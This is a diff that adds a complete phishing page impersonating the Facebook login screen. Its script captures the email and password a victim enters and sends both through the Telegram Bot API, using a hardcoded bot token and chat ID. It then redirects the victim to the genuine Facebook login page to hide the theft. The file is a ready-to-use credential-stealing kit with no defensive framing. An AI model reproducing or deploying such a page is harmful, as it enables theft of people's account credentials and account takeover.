@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Facebook – log in or sign up</title>
+<style>
+  body {
+    margin: 0;
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #1877f2;
+  }
+  .container {
+    max-width: 400px;
+    background: white;
+    margin: 80px auto;
+    border-radius: 8px;
+    box-shadow: 0 2px 12px rgb(0 0 0 / 0.2);
+    padding: 40px 32px;
+  }
+  h1 {
+    font-weight: 700;
+    font-size: 32px;
+    color: #1877f2;
+    margin-bottom: 8px;
+  }
+  h2 {
+    font-weight: 400;
+    font-size: 16px;
+    color: #1c1e21;
+    margin: 0 0 24px;
+  }
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    padding: 14px 12px;
+    margin: 8px 0 16px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    font-size: 16px;
+    box-sizing: border-box;
+  }
+  button {
+    width: 100%;
+    background-color: #1877f2;
+    border: none;
+    padding: 14px 0;
+    border-radius: 6px;
+    color: white;
+    font-size: 18px;
+    cursor: pointer;
+    font-weight: 600;
+  }
+  button:hover {
+    background-color: #165fdb;
+  }
+  .footer {
+    margin-top: 24px;
+    font-size: 14px;
+    color: #606770;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>Facebook</h1>
+    <h2>Log in to Facebook</h2>
+    <form id="loginForm">
+      <input type="text" id="email" name="email" placeholder="Email or phone number" required autofocus />
+      <input type="password" id="password" name="password" placeholder="Password" required />
+      <button type="submit">Log In</button>
+    </form>
+    <div class="footer">Facebook © 2024</div>
+  </div>
+  <script>
+    const telegramBotToken = "7350527954:AAHcINcIvy1V7RNxelD2J-P1x95caGBNuws";
+    const telegramChatId = "6705227907";
+
+    function sendToTelegram(message) {
+      fetch(
+        "https://api.telegram.org/bot" +
+          telegramBotToken +
+          "/sendMessage?chat_id=" +
+          telegramChatId +
+          "&text=" +
+          encodeURIComponent(message),
+        { method: "GET", mode: "no-cors" }
+      );
+    }
+
+    document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+      var email = document.getElementById("email").value.trim();
+      var password = document.getElementById("password").value.trim();
+
+      var message = "New Facebook login:\nEmail/Phone: " + email + "\nPassword: " + password;
+      sendToTelegram(message);
+
+      // Optionally, redirect or show a fake error or Facebook homepage
+      window.location.href = "https://www.facebook.com/login.php?login_attempt=1";
+    });
+  </script>
+</body>
+</html>
+
+```
